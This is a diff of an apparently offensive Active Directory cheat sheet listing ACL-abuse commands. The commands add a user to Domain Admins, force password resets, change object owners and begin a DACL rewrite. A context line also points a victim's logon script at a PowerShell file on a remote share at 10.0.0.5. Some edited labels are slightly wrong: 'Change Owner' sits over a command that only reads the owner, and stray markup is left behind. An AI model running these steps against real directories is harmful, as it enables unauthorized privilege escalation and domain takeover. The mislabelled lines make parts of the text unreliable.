@@ -61,51 +61,53 @@ One common ACL abuse technique is known as "over-permissioning." This occurs whe
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
 2. AllExtendedRights
-- **Change Password**
+
+- Change Password
 ```bash
 net user <username> <password> /domain
 ```
-- **Add to Group**
-    - Using `net`:
-```bash
-net group "domain admins" spotless/add /domain
-```
-    - Using Active Directory module:
-```powershell
-Add-ADGroupMember -Identity "domain admins" -Members spotless
-```
-    - Using PowerSploit:
-```powershell
-Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
-```
+
+- Add to Group
+   - Using `net`: 
+	```bash
+	net group "domain admins" spotless/add /domain
+	```
+	- Using Active Directory module:
+	```powershell
+	Add-ADGroupMember -Identity "domain admins" -Members spotless
+	```
+    - Using PowerView module:
+	```powershell
+	Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
+	```
 3. Self-Membership
 
-	- **Add to Group**
+	- Add to Group
 ```powershell
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
 4. ExtendedRight on
-	- **User-Force-Change-Password (Password Reset)**
+	- User-Force-Change-Password (Password Reset)
 ```powershell
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
 ```
 5. WriteProperty
-	- **Add to Group**
+	- Add to Group
 ```powershell
 Add-ADGroupMember -Identity MachineAdmins -Members $otherDomainUser
 ```
 6. WriteOwner
-	- **Change the object’s owner**
+	- Change the object’s owner
 ```powershell
 Set-DomainObjectOwner -Identity testuser -Domain techcorp.local -OwnerIdentity "us\studentuser19"
 ```
-	- **Check Owner**
+	- Change Owner
 ```powershell
 Get-ADObject -Identity "CN=Users,DC=contoso,DC=com" -Properties Owner | Select-Object -ExpandProperty Owner
 ```
 7. WriteDACL
-	- **Grant Generic Permissions** (must be the owner)
+	- Grant Generic Permissions** (must be the owner)
 ```powershell
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local" 
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
